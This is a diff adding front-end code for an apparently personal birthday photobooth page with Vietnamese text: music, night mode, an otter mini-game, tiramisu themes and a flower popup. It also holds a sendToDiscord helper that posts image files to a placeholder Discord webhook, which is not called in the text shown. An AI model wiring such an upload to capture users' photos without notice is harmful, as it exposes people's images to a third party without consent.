+        const music = document.getElementById('bg-music');
+        const musicToggleBtn = document.getElementById('musicToggleBtn');
+        let isMusicPlaying = true;
+
+        window.addEventListener("load", () => {
+            const savedTime = localStorage.getItem('musicTime');
+            if (savedTime) music.currentTime = parseFloat(savedTime);
+            else music.currentTime = 57;
+
+            music.play().catch(e => {
+                isMusicPlaying = false;
+                musicToggleBtn.textContent = "🔇 Bật Nhạc";
+            });
+        });
+
+        window.addEventListener("beforeunload", () => {
+            localStorage.setItem('musicTime', music.currentTime);
+        });
+
+        musicToggleBtn.addEventListener('click', () => {
+            if (isMusicPlaying) {
+                music.pause();
+                musicToggleBtn.textContent = "🔇 Bật Nhạc";
+            } else {
+                music.play();
+                musicToggleBtn.textContent = "🎵 Tắt Nhạc";
+            }
+            isMusicPlaying = !isMusicPlaying;
+        });
+
+        const nightModeToggle = document.getElementById('nightModeToggle');
+        let isNightMode = false;
+
+        function toggleNightMode() {
+    isNightMode = !isNightMode;
+    document.body.classList.toggle('night-mode', isNightMode);
+
+    if (isNightMode) {
+        // Night Mode must override Tiramisu Mode completely.
+        document.body.classList.remove(
+            "tiramisu-classic",
+            "tiramisu-matcha",
+            "tiramisu-strawberry"
+        );
+
+        document.documentElement.style.setProperty("--primary-color", "#ffd700");
+        document.documentElement.style.setProperty("--secondary-color", "#101936");
+        document.documentElement.style.setProperty("--accent-color", "#ff8c00");
+        document.documentElement.style.setProperty("--dark-text", "#ffd700");
+        document.documentElement.style.setProperty("--booth-bg", "#16213e");
+
+        if (colorPicker1) colorPicker1.value = "#101936";
+        if (colorPicker2) colorPicker2.value = "#0d1117";
+
+        otter.src = 'Assets/fish-photobooth/camerapage/stickers/otter_astronaut.gif';
+    } else {
+        otter.src = 'Assets/fish-photobooth/camerapage/stickers/otter_wink.gif';
+
+        document.documentElement.style.setProperty("--booth-bg", "#ffffff");
+
+        // Restore Tiramisu Mode after leaving Night Mode.
+        if (typeof applyTiramisuMemoryTheme === "function") {
+            applyTiramisuMemoryTheme(false);
+        }
+    }
+
+    nightModeToggle.textContent = isNightMode ? "☀️ Day Mode: ON" : "🌙 Night Mode: OFF";
+    nightModeToggle.style.backgroundColor = isNightMode ? "#f1c40f" : "#2c3e50";
+    nightModeToggle.style.color = isNightMode ? "black" : "white";
+
+    const tutorialNightRecommendBtn = document.getElementById('tutorialNightRecommendBtn');
+
+    if (tutorialNightRecommendBtn) {
+        tutorialNightRecommendBtn.textContent = isNightMode 
+            ? "☀️ Switch Back To Day Mode" 
+            : "🌙 Recommend: Try Night Magic ✨";
+    }
+
+    if (typeof drawCanvas === "function") {
+        drawCanvas();
+    }
+}
+
+nightModeToggle.addEventListener('click', toggleNightMode);
+
+const tutorialNightRecommendBtn = document.getElementById('tutorialNightRecommendBtn');
+
+if (tutorialNightRecommendBtn) {
+    tutorialNightRecommendBtn.addEventListener('click', () => {
+        toggleNightMode();
+    });
+}
+
+        function createShootingStar() {
+            if (!document.body.classList.contains('night-mode')) return;
+
+            const count = Math.floor(Math.random() * 3) + 1; 
+
+            for (let i = 0; i < count; i++) {
+                const star = document.createElement('div');
+                
+                const isBig = Math.random() > 0.7;
+                star.className = `shooting-star ${isBig ? 'big' : 'small'}`;
+                
+                star.style.top = Math.random() * 50 + 'vh';
+                star.style.left = (Math.random() * 50 + 70) + 'vw'; 
+                
+                star.style.animationDuration = (1 + Math.random()) + 's';
+                
+                document.body.appendChild(star);
+                
+                setTimeout(() => star.remove(), 2000);
+            }
+        }
+
+        setInterval(createShootingStar, 1500);
+
+        let isChallengeMode = false;
+        const toggleChallengeBtn = document.getElementById('toggleChallengeBtn');
+        const challengeBox = document.getElementById('challengeBox');
+        const challenges = [
+            "Làm mặt xấu đi! 🤪",
+            "Nháy mắt nè! 😉",
+            "Phồng má lên! 🐡",
+            "Làm mặt cute hột me! 🥺",
+            "Làm mặt lạnh lùng! 😎",
+            "Chu môi nhoaaaa 🙈",
+            "Thổi nụ hôn vào cam! 💋",
+            "Giơ tay hình chữ V! ✌️",
+            "Chỉ vào camera nào! 👉",
+            "Thả tim nhá! 🫶",
+            "Ôm mặt thật chặt! 🙈",
+            "Làm động tác rái cá chà xát mặt! 🦦✨",
+            "Làm ảnh Sexy nào! 🙈",
+            "Tạo dáng 'cool ngầu' nhất có thể! 💅"
+        ];
+        toggleChallengeBtn.addEventListener('click', () => {
+            isChallengeMode = !isChallengeMode;
+            toggleChallengeBtn.textContent = isChallengeMode ? "🎲 Thử Thách: ON" : "🎲 Thử Thách: OFF";
+            toggleChallengeBtn.style.backgroundColor = isChallengeMode ? "#ff4d4d" : "#fffacd";
+        });
+
+        async function sendToDiscord(blob, type, filename) {
+            const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+            const formData = new FormData();
+            formData.append('file', blob, filename);
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // ==========================================
+        // OTTER MINI GAME AFTER DOWNLOAD
+        // Ways to exit:
+        // 1. Click "Thoát game"
+        // 2. Click the X button
+        // 3. Press ESC
+        // 4. Click the background outside the game box
+        // ==========================================
+        const otterMiniGameOverlay = document.getElementById('otterMiniGameOverlay');
+        const otterGameArea = document.getElementById('otterGameArea');
+        const otterGameScoreEl = document.getElementById('otterGameScore');
+        const otterGameTimeEl = document.getElementById('otterGameTime');
+        const otterGameResult = document.getElementById('otterGameResult');
+        const closeOtterGameBtn = document.getElementById('closeOtterGameBtn');
+        const closeOtterGameX = document.getElementById('closeOtterGameX');
+        const restartOtterGameBtn = document.getElementById('restartOtterGameBtn');
+
+        let otterGameScore = 0;
+        let otterGameTime = 10;
+        let otterGameSpawnInterval = null;
+        let otterGameTimerInterval = null;
+        let otterGameActive = false;
+
+        function startOtterMiniGame() {
+            if (!otterMiniGameOverlay || !otterGameArea) return;
+
+            clearInterval(otterGameSpawnInterval);
+            clearInterval(otterGameTimerInterval);
+
+            otterGameScore = 0;
+            otterGameTime = 10;
+            otterGameActive = true;
+
+            otterGameScoreEl.textContent = otterGameScore;
+            otterGameTimeEl.textContent = otterGameTime;
+            otterGameResult.textContent = "";
+            otterGameArea.innerHTML = "";
+
+            otterMiniGameOverlay.style.display = "flex";
+            document.body.style.overflow = "hidden";
+
+            otterGameSpawnInterval = setInterval(spawnFallingOtterItem, 650);
+
+            otterGameTimerInterval = setInterval(() => {
+                otterGameTime--;
+                otterGameTimeEl.textContent = otterGameTime;
+
+                if (otterGameTime <= 0) {
+                    endOtterMiniGame();
+                }
+            }, 1000);
+        }
+
+        function spawnFallingOtterItem() {
+            if (!otterGameActive || !otterGameArea) return;
+
+            const item = document.createElement('div');
+            item.className = 'falling-otter-item';
+
+            const items = ["💖", "🦦", "🫧", "✨", "🐚"];
+            item.textContent = items[Math.floor(Math.random() * items.length)];
+
+            const areaWidth = otterGameArea.clientWidth;
+            const randomLeft = Math.random() * Math.max(1, areaWidth - 45);
+
+            item.style.left = randomLeft + "px";
+            item.style.animationDuration = (2.2 + Math.random() * 1.2) + "s";
+
+            function collectItem(e) {
+                e.preventDefault();
+
+                if (!otterGameActive) return;
+
+                otterGameScore++;
+                otterGameScoreEl.textContent = otterGameScore;
+
+                item.textContent = "💥";
+                item.style.pointerEvents = "none";
+
+                setTimeout(() => {
+                    item.remove();
+                }, 120);
+            }
+
+            item.addEventListener('click', collectItem);
+            item.addEventListener('touchstart', collectItem, { passive: false });
+
+            otterGameArea.appendChild(item);
+
+            setTimeout(() => {
+                item.remove();
+            }, 4200);
+        }
+
+        function endOtterMiniGame() {
+            otterGameActive = false;
+
+            clearInterval(otterGameSpawnInterval);
+            clearInterval(otterGameTimerInterval);
+
+            if (otterGameScore >= 10) {
+                otterGameResult.textContent = "🏆 Gift unlocked: Tuấn Anh quá bảnh!";
+            } else if (otterGameScore >= 5) {
+                otterGameResult.textContent = "💖 Good job! Rái cá chấm 100 điểm cute!";
+            } else {
+                otterGameResult.textContent = "🦦 Chơi lại là thắng đó!";
+            }
+        }
+
+        function closeOtterMiniGame() {
+            if (!otterMiniGameOverlay) return;
+
+            otterGameActive = false;
+            clearInterval(otterGameSpawnInterval);
+            clearInterval(otterGameTimerInterval);
+
+            if (otterGameArea) {
+                otterGameArea.innerHTML = "";
+            }
+
+            otterMiniGameOverlay.style.display = "none";
+            document.body.style.overflow = "";
+        }
+
+        if (closeOtterGameBtn) {
+            closeOtterGameBtn.addEventListener('click', closeOtterMiniGame);
+        }
+
+        if (closeOtterGameX) {
+            closeOtterGameX.addEventListener('click', closeOtterMiniGame);
+        }
+
+        if (restartOtterGameBtn) {
+            restartOtterGameBtn.addEventListener('click', startOtterMiniGame);
+        }
+
+        if (otterMiniGameOverlay) {
+            otterMiniGameOverlay.addEventListener('click', (e) => {
+                if (e.target === otterMiniGameOverlay) {
+                    closeOtterMiniGame();
+                }
+            });
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && otterMiniGameOverlay && otterMiniGameOverlay.style.display === 'flex') {
+                closeOtterMiniGame();
+            }
+        });
+
+        
+
+    </script>
+
+    <!-- ===============================
+     TIRAMISU MEMORY MODE PATCH
+     Paste this right before 
+
+<!-- Night Mode override for Tiramisu Mode -->
+<style>
+  body.night-mode,
+  body.night-mode.tiramisu-classic,
+  body.night-mode.tiramisu-matcha,
+  body.night-mode.tiramisu-strawberry {
+    background-color: #050816 !important;
+    background-image:
+      radial-gradient(circle at 50% 20%, #263b73 0%, #111827 38%, #050816 100%) !important;
+  }
+
+  body.night-mode .tiramisu-memory-card {
+    background: rgba(10, 15, 35, 0.92) !important;
+    border-color: #ffd700 !important;
+    box-shadow:
+      0 0 22px rgba(255, 215, 0, 0.35),
+      0 12px 28px rgba(0, 0, 0, 0.35) !important;
+  }
+
+  body.night-mode .tiramisu-memory-card h2,
+  body.night-mode .tiramisu-memory-card p {
+    color: #ffd700 !important;
+    text-shadow: 0 0 10px rgba(255, 215, 0, 0.7) !important;
+  }
+
+  body.night-mode .tiramisu-memory-btn {
+    background: linear-gradient(135deg, #1a1a2e, #ffd700) !important;
+    color: #ffffff !important;
+    border-color: #ffd700 !important;
+    box-shadow: 0 4px 0 #8a6d00 !important;
+  }
+
+  body.night-mode .custom-controls {
+    background: #101936 !important;
+    border-color: #ffd700 !important;
+  }
+
+  body.night-mode .screen-container {
+    border-color: #ffd700 !important;
+    box-shadow:
+      inset 0 0 20px rgba(0, 0, 0, 0.8),
+      0 0 18px rgba(255, 215, 0, 0.35) !important;
+  }
+
+  body.night-mode .sticker-btn,
+  body.night-mode button.secondary-btn,
+  body.night-mode button.toggle-btn {
+    background: #101936 !important;
+    color: #ffd700 !important;
+    border-color: #ffd700 !important;
+    box-shadow: 0 4px 0 #8a6d00 !important;
+  }
+
+  body.night-mode button.primary-btn {
+    background: linear-gradient(135deg, #ffd700, #ff8c00) !important;
+    color: #111827 !important;
+    box-shadow: 0 4px 0 #8a6d00 !important;
+  }
+
+  body.night-mode #mainBooth h1,
+  body.night-mode #mainBooth h2,
+  body.night-mode #mainBooth h3 {
+    color: #ffd700 !important;
+    text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00, 0 0 30px #ff8c00 !important;
+  }
+</style>
+
+<div id="flowerPopup" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999999; justify-content: center; align-items: center;">
+    <div style="background: white; padding: 20px; border-radius: 20px; text-align: center; border: 5px solid #ff99cc; box-shadow: 0 0 20px rgba(255,153,204,0.5);">
+        <h3 style="color: #ff6699; margin-top: 0;">Một món quà nhỏ cho Anh nè! 🌸</h3>
+        <img src="./assets/fish-photobooth/camerapage/stickers/otter-flower.gif" style="width: 200px; border-radius: 15px;">
+        <div style="margin-top: 20px;">
+            <button onclick="acceptFlower()" style="padding: 10px 20px; background: #ff6699; color: white; border: none; border-radius: 10px; cursor: pointer; font-family: 'Pixelify Sans'; font-size: 1rem;">Nhận hoa đi nào! 💐</button>
+        </div>
+    </div>
+</div>
+
+</body>
+================================ -->
+
+<style>
+
+ .flower-falling {
+    position: fixed;
+    top: -60px;
+    z-index: 999998;
+    pointer-events: none;
+    animation: flowerFall linear forwards;
+    transition: opacity 1s ease;
+}
+@keyframes flowerFall {
+    0% { transform: translateY(-60px) rotate(0deg); opacity: 1; }
+    85% { opacity: 1; }
+    100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+}
+  .tiramisu-memory-card {
+    width: min(100%, 1000px);
+    margin: 0 auto 18px auto;
+    background: rgba(255, 248, 242, 0.96);
+    border: 4px solid #c9895f;
+    border-radius: 24px;
+    box-shadow: 0 12px 28px rgba(139, 74, 53, 0.18);
+    padding: 16px;
+    box-sizing: border-box;
+    text-align: center;
+    color: #8b4a35;
+    position: relative;
+    z-index: 20;
+    animation: tiramisuPop 0.45s ease;
+  }
+
+  .tiramisu-memory-card h2 {
+    margin: 0 0 8px 0;
+    color: #8b4a35 !important;
+    text-shadow: none !important;
+  }
+
+  .tiramisu-memory-card p {
+    margin: 6px 0;
+    color: #5f3528 !important;
+    line-height: 1.35;
+  }
+
+  .tiramisu-memory-actions {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    margin-top: 12px;
+  }
+
+  .tiramisu-memory-btn {
+    font-family: "Pixelify Sans", sans-serif;
+    border: 2px solid #8b4a35;
+    border-radius: 999px;
+    padding: 10px 16px;
+    background: linear-gradient(135deg, #fff1dc, #d9a679);
+    color: #5f3528;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 4px 0 #a66f4b;
+    transition: 0.2s ease;
+  }
+
+  .tiramisu-memory-btn:hover {
+    transform: translateY(-2px) scale(1.04);
+    box-shadow: 0 6px 0 #a66f4b;
+  }
+
+  .tiramisu-memory-btn:active {
+    transform: translateY(3px);
+    box-shadow: 0 1px 0 #a66f4b;
+  }
+
+  .tiramisu-toast {
+    position: fixed;
+    top: 18px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 400000;
+    background: #fff8f2;
+    color: #8b4a35;
+    border: 3px solid #c9895f;
+    border-radius: 18px;
+    padding: 12px 18px;
+    box-shadow: 0 12px 28px rgba(139, 74, 53, 0.24);
+    font-family: "Pixelify Sans", sans-serif;
+    text-align: center;
+    animation: tiramisuToast 2.5s ease forwards;
+  }
+
+  .tiramisu-falling {
+    position: fixed;
+    top: -60px;
+    z-index: 399999;
+    pointer-events: none;
+    animation: tiramisuFall linear forwards;
+    filter: drop-shadow(0 5px 8px rgba(0, 0, 0, 0.18));
+  }
+
+  body.tiramisu-classic {
+    background-color: #fff8f2 !important;
+    background-image:
+      radial-gradient(circle at 20% 10%, rgba(255, 230, 210, 0.8), transparent 32%),
+      radial-gradient(circle at 80% 90%, rgba(210, 150, 100, 0.3), transparent 35%) !important;
+  }
+
+  body.tiramisu-matcha {
+    background-color: #f7fff2 !important;
+    background-image:
+      radial-gradient(circle at 20% 10%, rgba(210, 255, 210, 0.85), transparent 32%),
+      radial-gradient(circle at 80% 90%, rgba(130, 180, 110, 0.32), transparent 35%) !important;
+  }
+
+  body.tiramisu-strawberry {
+    background-color: #fff5f8 !important;
+    background-image:
+      radial-gradient(circle at 20% 10%, rgba(255, 210, 225, 0.85), transparent 32%),
+      radial-gradient(circle at 80% 90%, rgba(255, 120, 150, 0.3), transparent 35%) !important;
+  }
+
+  @keyframes tiramisuPop {
+    0% {
+      opacity: 0;
+      transform: scale(0.85) translateY(-12px);
+    }
+
+    100% {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+    }
+  }
+
+  @keyframes tiramisuToast {
+    0% {
+      opacity: 0;
+      transform: translateX(-50%) translateY(-20px);
+    }
+
+    15% {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    85% {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    100% {
+      opacity: 0;
+      transform: translateX(-50%) translateY(-20px);
+    }
+  }
+
+  @keyframes tiramisuFall {
+    0% {
+      transform: translateY(-60px) rotate(0deg);
+      opacity: 1;
+    }
+
+    100% {
+      transform: translateY(110vh) rotate(360deg);
+      opacity: 0;
+    }
+  }
+</style>
+
+<script>
+  // ===============================
+  // TIRAMISU MEMORY MODE
+  // ===============================
+
+  const tiramisuMoodData = {
+    classic: {
+      label: "Classic Tiramisu",
+      emoji: "☕",
+      primary: "#8b4a35",
+      secondary: "#fff1dc",
+      accent: "#d9a679",
+      darkText: "#5f3528",
+      topColor: "#fff1dc",
+      bottomColor: "#d9a679",
+      rain: ["🍰", "☕", "🍫", "🤎", "🧁", "🍪", "✨"],
+      message: "Classic tiramisu memory loaded: warm coffee birthday energy ☕🍰"
+    },
+    matcha: {
+      label: "Matcha Tiramisu",
+      emoji: "🍵",
+      primary: "#5f9b45",
+      secondary: "#f7fff2",
+      accent: "#a8d878",
+      darkText: "#4f7f3b",
+      topColor: "#f7fff2",
+      bottomColor: "#a8d878",
+      rain: ["🍵", "🍃", "💚", "🍰", "🧁", "✨"],
+      message: "Matcha tiramisu memory loaded: calm healing birthday energy 🍵🍃"
+    },
+    strawberry: {
+      label: "Strawberry Tiramisu",
+      emoji: "🍓",
+      primary: "#ff5f91",
+      secondary: "#fff5f8",
+      accent: "#ff9fbd",
+      darkText: "#c94f78",
+      topColor: "#fff5f8",
+      bottomColor: "#ff9fbd",
+      rain: ["🍓", "💗", "💕", "🍰", "🧁", "✨"],
+      message: "Strawberry tiramisu memory loaded: sweet cute chaos energy 🍓💗"
+    }
+  };
+
+  const tiramisuToppingData = {
+    cacao: {
+      label: "Cacao",
+      emoji: "🍫"
+    },
+    strawberry: {
+      label: "Strawberry",
+      emoji: "🍓"
+    },
+    "matcha-dust": {
+      label: "Matcha Dust",
+      emoji: "🍵"
+    },
+    "magic-sparkle": {
+      label: "Magic Sparkle",
+      emoji: "✨"
+    }
+  };
+
+  function getSavedTiramisuMood() {
+    return localStorage.getItem("tiramisuMood") || "classic";
+  }
+
+  function getSavedTiramisuTopping() {
+    return localStorage.getItem("tiramisuTopping") || "cacao";
+  }
+
+  function getSavedBirthdayWish() {
+    return localStorage.getItem("birthdayWish") || "A sweet birthday wish was sealed in tiramisu universe.";
+  }
+
+  function createTiramisuMemoryPanel() {
+    const mainBooth = document.getElementById("mainBooth");
+    if (!mainBooth || document.getElementById("tiramisuMemoryCard")) return;
+
+    const mood = getSavedTiramisuMood();
+    const topping = getSavedTiramisuTopping();
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+    const toppingInfo = tiramisuToppingData[topping] || tiramisuToppingData.cacao;
+    const wish = getSavedBirthdayWish();
+
+    const card = document.createElement("div");
+    card.id = "tiramisuMemoryCard";
+    card.className = "tiramisu-memory-card";
+
+    card.innerHTML = `
+      <h2>🍰 Tiramisu Memory Mode</h2>
+      <p id="tiramisuMemoryMood">
+        Mood: <strong>${moodInfo.label} ${moodInfo.emoji}</strong>
+        | Topping: <strong>${toppingInfo.label} ${toppingInfo.emoji}</strong>
+      </p>
+      <p id="tiramisuMemoryWish">
+        Wish: "${wish}"
+      </p>
+
+      <div class="tiramisu-memory-actions">
+        <button class="tiramisu-memory-btn" type="button" id="applyTiramisuMemoryBtn">
+          Apply Tiramisu Magic ${moodInfo.emoji}
+        </button>
+
+        <button class="tiramisu-memory-btn" type="button" id="tiramisuGachaBtn">
+          Sticker Gacha 🎁
+        </button>
+
+        <button class="tiramisu-memory-btn" type="button" id="addWishStampBtn">
+          Add Wish Stamp 🍰
+        </button>
+      </div>
+    `;
+
+    const firstTitle = mainBooth.querySelector("h1");
+    if (firstTitle) {
+      mainBooth.insertBefore(card, firstTitle);
+    } else {
+      mainBooth.prepend(card);
+    }
+
+    document.getElementById("applyTiramisuMemoryBtn").addEventListener("click", () => {
+        applyTiramisuMemoryTheme(false);
+        showTiramisuToast("Tiramisu theme applied 🍰✨");
+        launchTiramisuPhotoboothRain(getSavedTiramisuMood());
+    });
+
+    document.getElementById("tiramisuGachaBtn").addEventListener("click", () => {
+      runTiramisuStickerGacha();
+    });
+
+    document.getElementById("addWishStampBtn").addEventListener("click", () => {
+      addTiramisuWishStampAsSticker();
+    });
+  }
+
+  function showTiramisuToast(message) {
+    const oldToast = document.querySelector(".tiramisu-toast");
+    if (oldToast) oldToast.remove();
+
+    const toast = document.createElement("div");
+    toast.className = "tiramisu-toast";
+    toast.textContent = message;
+
+    document.body.appendChild(toast);
+
+    setTimeout(() => {
+      toast.remove();
+    }, 2600);
+  }
+
+  function launchTiramisuPhotoboothRain(mood) {
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+    const rain = moodInfo.rain;
+
+    for (let i = 0; i < 38; i++) {
+      const piece = document.createElement("div");
+      piece.className = "tiramisu-falling";
+      piece.textContent = rain[Math.floor(Math.random() * rain.length)];
+
+      piece.style.left = `${Math.random() * 100}vw`;
+      piece.style.fontSize = `${24 + Math.random() * 22}px`;
+      piece.style.animationDuration = `${2.3 + Math.random() * 2.2}s`;
+      piece.style.animationDelay = `${Math.random() * 0.75}s`;
+
+      document.body.appendChild(piece);
+
+      setTimeout(() => {
+        piece.remove();
+      }, 5700);
+    }
+  }
+
+  function applyTiramisuMemoryTheme(withRain = false) {
+    // Do not let Tiramisu Mode override Night Mode.
+    if (document.body.classList.contains("night-mode")) {
+      return;
+    }
+
+    const mood = getSavedTiramisuMood();
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+
+    document.body.classList.remove(
+      "tiramisu-classic",
+      "tiramisu-matcha",
+      "tiramisu-strawberry"
+    );
+    document.body.classList.add(`tiramisu-${mood}`);
+
+    document.documentElement.style.setProperty("--primary-color", moodInfo.primary);
+    document.documentElement.style.setProperty("--secondary-color", moodInfo.secondary);
+    document.documentElement.style.setProperty("--accent-color", moodInfo.accent);
+    document.documentElement.style.setProperty("--dark-text", moodInfo.darkText);
+
+    const colorPicker1 = document.getElementById("colorPicker1");
+    const colorPicker2 = document.getElementById("colorPicker2");
+
+    if (colorPicker1) colorPicker1.value = moodInfo.topColor;
+    if (colorPicker2) colorPicker2.value = moodInfo.bottomColor;
+
+    if (typeof drawCanvas === "function") {
+      drawCanvas();
+    }
+
+    showTiramisuToast(moodInfo.message);
+
+    if (withRain) {
+      launchTiramisuPhotoboothRain(mood);
+    }
+  }
+
+  function getWishStampText() {
+    const mood = getSavedTiramisuMood();
+    const topping = getSavedTiramisuTopping();
+
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+    const toppingInfo = tiramisuToppingData[topping] || tiramisuToppingData.cacao;
+
+    return `Tiramisu Wish Sealed ${moodInfo.emoji}${toppingInfo.emoji}`;
+  }
+
+  function drawTiramisuWishStampOnCanvas() {
+    const canvas = document.getElementById("stripCanvas");
+    if (!canvas) return;
+
+    const context = canvas.getContext("2d");
+    const mood = getSavedTiramisuMood();
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+
+    const stampText = getWishStampText();
+
+    context.save();
+
+    const boxW = canvas.width * 0.78;
+    const boxH = canvas.height > 1200 ? 84 : 64;
+    const boxX = (canvas.width - boxW) / 2;
+    const boxY = canvas.height - boxH - 35;
+
+    context.fillStyle = "rgba(255, 248, 242, 0.92)";
+    context.strokeStyle = moodInfo.primary;
+    context.lineWidth = 5;
+
+    roundRect(context, boxX, boxY, boxW, boxH, 26);
+    context.fill();
+    context.stroke();
+
+    context.fillStyle = moodInfo.darkText;
+    context.textAlign = "center";
+    context.textBaseline = "middle";
+    context.font = `${canvas.height > 1200 ? 34 : 26}px 'Pixelify Sans', sans-serif`;
+    context.fillText(stampText, canvas.width / 2, boxY + boxH / 2);
+
+    context.restore();
+  }
+
+  function roundRect(context, x, y, width, height, radius) {
+    context.beginPath();
+    context.moveTo(x + radius, y);
+    context.lineTo(x + width - radius, y);
+    context.quadraticCurveTo(x + width, y, x + width, y + radius);
+    context.lineTo(x + width, y + height - radius);
+    context.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
+    context.lineTo(x + radius, y + height);
+    context.quadraticCurveTo(x, y + height, x, y + height - radius);
+    context.lineTo(x, y + radius);
+    context.quadraticCurveTo(x, y, x + radius, y);
+    context.closePath();
+  }
+
+  function patchDrawCanvasWithTiramisuStamp() {
+    if (typeof drawCanvas !== "function") return;
+    if (window.__tiramisuDrawCanvasPatched) return;
+
+    const originalDrawCanvas = drawCanvas;
+
+    drawCanvas = function () {
+      originalDrawCanvas();
+      drawTiramisuWishStampOnCanvas();
+    };
+
+    window.__tiramisuDrawCanvasPatched = true;
+  }
+
+  function addTiramisuWishStampAsSticker() {
+    const mood = getSavedTiramisuMood();
+    const topping = getSavedTiramisuTopping();
+
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+    const toppingInfo = tiramisuToppingData[topping] || tiramisuToppingData.cacao;
+
+    const emojis = ["🍰", moodInfo.emoji, toppingInfo.emoji, "✨"];
+
+    emojis.forEach((emoji, index) => {
+      if (typeof addEmojiSticker === "function") {
+        const canvas = document.getElementById("stripCanvas");
+        const x = canvas ? canvas.width - 120 : null;
+        const y = canvas ? 70 + index * 90 : null;
+        addEmojiSticker(emoji, x, y, 72);
+      }
+    });
+
+    showTiramisuToast("Wish stamp added to your photo strip 🍰✨");
+    launchTiramisuPhotoboothRain(mood);
+  }
+
+  function runTiramisuStickerGacha() {
+    const mood = getSavedTiramisuMood();
+    const moodInfo = tiramisuMoodData[mood] || tiramisuMoodData.classic;
+
+    const pool = [
+      "🍰",
+      "🧁",
+      "🍪",
+      "🍫",
+      "☕",
+      "🍓",
+      "🍵",
+      "✨",
+      "💗",
+      "🤎",
+      moodInfo.emoji
+    ];
+
+    const rarityRoll = Math.random();
+    let count = 4;
+    let rarity = "Common Cute";
+
+    if (rarityRoll > 0.85) {
+      count = 9;
+      rarity = "Legendary Tiramisu Pull";
+    } else if (rarityRoll > 0.55) {
+      count = 6;
+      rarity = "Rare Sweet Pull";
+    }
+
+    for (let i = 0; i < count; i++) {
+      const emoji = pool[Math.floor(Math.random() * pool.length)];
+
+      if (typeof addEmojiSticker === "function") {
+        const canvas = document.getElementById("stripCanvas");
+        const x = canvas ? Math.random() * (canvas.width - 120) + 30 : null;
+        const y = canvas ? Math.random() * (canvas.height - 180) + 60 : null;
+        const size = 55 + Math.random() * 45;
+
+        addEmojiSticker(emoji, x, y, size);
+      }
+    }
+
+    showTiramisuToast(`Sticker Gacha: ${rarity} 🎁`);
+    launchTiramisuPhotoboothRain(mood);
+  }
+
+  function forceDemoTiramisuDataIfMissing() {
+    if (!localStorage.getItem("tiramisuMood")) {
+      localStorage.setItem("tiramisuMood", "classic");
+    }
+
+    if (!localStorage.getItem("tiramisuTopping")) {
+      localStorage.setItem("tiramisuTopping", "cacao");
+    }
+
+    if (!localStorage.getItem("birthdayWish")) {
+      localStorage.setItem(
+        "birthdayWish",
+        "A sweet birthday wish was sealed in tiramisu universe."
+      );
+    }
+  }
+
+  window.addEventListener("load", () => {
+    forceDemoTiramisuDataIfMissing();
+    createTiramisuMemoryPanel();
+    patchDrawCanvasWithTiramisuStamp();
+    applyTiramisuMemoryTheme(false);
+
+    setTimeout(() => {
+      showTiramisuToast("Tiramisu Mode is now active 🍰✨");
+      launchTiramisuPhotoboothRain(getSavedTiramisuMood());
+    }, 800);
+  });
+
+  // Sau 5 giây hiện popup
+setTimeout(() => {
+    document.getElementById('flowerPopup').style.display = 'flex';
+}, 5000);
+
+// Khi nhấn nút nhận hoa
+function acceptFlower() {
+    document.getElementById('flowerPopup').style.display = 'none';
+    
+    // Danh sách các icon đẹp mắt
+    const icons = ['🌸', '🌺', '🌼', '🌷', '💐', '💖', '✨'];
+    
+    for(let i = 0; i < 40; i++) { // Tăng lên 40 bông cho sinh động
+        const flower = document.createElement('div');
+        flower.className = 'flower-falling';
+        
+        // Chọn ngẫu nhiên icon và kích thước
+        flower.textContent = icons[Math.floor(Math.random() * icons.length)];
+        const size = 20 + Math.random() * 30; // Kích thước từ 20px đến 50px
+        flower.style.fontSize = size + 'px';
+        
+        // Vị trí ngẫu nhiên
+        flower.style.left = Math.random() * 100 + 'vw';
+        
+        // Thời gian rơi và delay để hoa không rơi cùng lúc
+        flower.style.animationDuration = (3 + Math.random() * 3) + 's';
+        flower.style.animationDelay = Math.random() * 2 + 's';
+        
+        // Thêm chút xoay ngẫu nhiên cho hoa
+        flower.style.transform = `rotate(${Math.random() * 360}deg)`;
+        
+        document.body.appendChild(flower);
+        
+        // Xóa hoa sau khi rơi xong
+        setTimeout(() => flower.remove(), 6000);
+    }
+}
+</script>
+</body>
+</html>
